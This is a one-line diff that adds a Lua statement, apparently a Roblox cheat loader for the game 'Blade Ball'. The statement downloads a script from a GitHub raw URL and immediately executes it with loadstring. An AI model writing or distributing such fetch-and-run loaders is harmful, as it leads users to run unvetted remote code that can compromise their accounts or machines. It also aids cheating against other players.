@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AC447724/Blade-Ball/main/c5xkvercelv5.lua.txt"))()
